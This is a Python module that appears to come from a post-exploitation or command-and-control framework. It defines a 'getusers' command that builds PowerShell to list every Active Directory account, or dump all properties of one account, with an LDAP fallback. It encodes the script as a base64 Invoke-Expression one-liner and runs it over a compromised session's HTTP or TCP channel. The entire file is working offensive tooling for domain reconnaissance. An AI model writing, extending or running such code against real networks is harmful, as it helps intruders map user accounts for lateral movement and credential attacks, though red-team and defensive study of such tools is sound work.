import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("getusers")
class GetUsersCommand(Command):
	"""List all users or dump properties for a single user."""

	@property
	def help(self):
		return "getusers [-f <username>] [-d <domain>] [--dc-ip <ip>]"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="getusers", add_help=False)
		parser.add_argument("-f","--filter", dest="username", required=False, help="Username to fetch all AD properties for")
		parser.add_argument("-d","--domain", dest="domain",   required=False, help="AD domain name (FQDN) or NetBIOS")
		parser.add_argument("--dc-ip",      dest="dc_ip",     required=False, help="IP address of the Domain Controller")

		try:
			opts = parser.parse_args(args)

		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid      = self.gs.sid,
			os_type  = self.gs.os_type,
			username = opts.username,
			domain   = opts.domain,
			dc_ip    = opts.dc_ip,
			op_id    = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightred + "[!] No output")

	def logic(self, sid, os_type, username=None, domain=None, dc_ip=None, op_id="console"):
		"""
		getusers [-f <username>]
		- No username: lists all SamAccountName values.
		- With username: returns every AD property (Name: Value) for that account.
		"""
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"
		transport = sess.transport.lower()

		# Build appropriate PowerShell snippet

		if dc_ip:
			if username:
				# single-user, fetch all properties
				ps = f"""
$T = '{dc_ip}'
try {{
		$nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
	}} catch {{
		$nb = $T
	}}

try {{
  if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
	  Get-ADUser -Identity '{username}' -Server $nb -Properties * | Format-List *
  }} else {{
	  # native LDAP fallback
	  $ldapPath = "LDAP://$nb"
	  $root = ([ADSI] $ldapPath).defaultNamingContext
	  $searcher = New-Object System.DirectoryServices.DirectorySearcher
	  $searcher.SearchRoot = [ADSI]"LDAP://$root"
	  $searcher.Filter = "(samAccountName={username})"
	  $res = $searcher.FindOne()
	  if ($res) {{
		foreach ($p in $res.Properties.PropertyNames) {{
		  $val = $res.Properties[$p][0]
		  Write-Output "$p`: $val"
		}}
	  }}
  }}
}} catch {{
	  $ldapPath = "LDAP://$nb"
	  $root = ([ADSI] $ldapPath).defaultNamingContext
	  $searcher = New-Object System.DirectoryServices.DirectorySearcher
	  $searcher.SearchRoot = [ADSI]"LDAP://$root"
	  $searcher.Filter = "(samAccountName={username})"
	  $res = $searcher.FindOne()
	  if ($res) {{
		foreach ($p in $res.Properties.PropertyNames) {{
		  $val = $res.Properties[$p][0]
		  Write-Output "$p`: $val"
		}}
	  }}
}}
"""
			else:
				# no filter → list all SamAccountName
				ps = f"""

$T = '{dc_ip}'
try {{
		$nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
	}} catch {{
		$nb = $T
	}}

try {{
	if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
		Get-ADUser -Server $nb -Filter * | Select-Object -ExpandProperty SamAccountName
	}} else {{
		# native LDAP fallback
		$ldapPath = "LDAP://$nb"
		$root = ([ADSI] $ldapPath).defaultNamingContext
		$searcher  = New-Object System.DirectoryServices.DirectorySearcher(
			\"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\"
		)
		$searcher.PageSize = 1000
		$results = $searcher.FindAll()
		foreach ($r in $results) {{
			$acct = $r.Properties[\"samaccountname\"][0]
			if ($acct) {{ Write-Output $acct }}
		}}
	}}
}} catch {{
	$ldapPath = "LDAP://$nb"
	$root = ([ADSI] $ldapPath).defaultNamingContext
	$searcher = New-Object System.DirectoryServices.DirectorySearcher(\"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\")
	$searcher.PageSize = 1000
	$results = $searcher.FindAll()
	foreach ($r in $results) {{
		$acct = $r.Properties[\"samaccountname\"][0]
		if ($acct) {{ Write-Output $acct }}
	}}
}}
"""


		else:
			if username:
				# single-user, fetch all properties
				ps = f"""
try {{
  if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
	  Get-ADUser -Identity '{username}' -Properties * | Format-List *
  }} else {{
	  # native LDAP fallback
	  $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
	  $searcher = New-Object System.DirectoryServices.DirectorySearcher
	  $searcher.SearchRoot = [ADSI]"LDAP://$root"
	  $searcher.Filter = "(samAccountName={username})"
	  $res = $searcher.FindOne()
	  if ($res) {{
		foreach ($p in $res.Properties.PropertyNames) {{
		  $val = $res.Properties[$p][0]
		  Write-Output "$p`: $val"
		}}
	  }}
  }}
}} catch {{
  $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
	  $searcher = New-Object System.DirectoryServices.DirectorySearcher
	  $searcher.SearchRoot = [ADSI]"LDAP://$root"
	  $searcher.Filter = "(samAccountName={username})"
	  $res = $searcher.FindOne()
	  if ($res) {{
		foreach ($p in $res.Properties.PropertyNames) {{
		  $val = $res.Properties[$p][0]
		  Write-Output "$p`: $val"
		}}
	  }}
}}
"""
			else:
				# no filter → list all SamAccountName
				ps = """
try {
	if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {
		Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
	} else {
		# native LDAP fallback
		$root      = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext
		$searcher  = New-Object System.DirectoryServices.DirectorySearcher(
			\"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\"
		)
		$searcher.PageSize = 1000
		$results = $searcher.FindAll()
		foreach ($r in $results) {
			$acct = $r.Properties[\"samaccountname\"][0]
			if ($acct) { Write-Output $acct }
		}
	}
} catch {
	# on any error, repeat the LDAP fallback
	$root      = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext
	$searcher  = New-Object System.DirectoryServices.DirectorySearcher(
		\"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\"
	)
	$searcher.PageSize = 1000
	$results = $searcher.FindAll()
	foreach ($r in $results) {
		$acct = $r.Properties[\"samaccountname\"][0]
		if ($acct) { Write-Output $acct }
	}
}
"""

		# Encode to one‐liner
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)

		# Dispatch
		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		return out or ""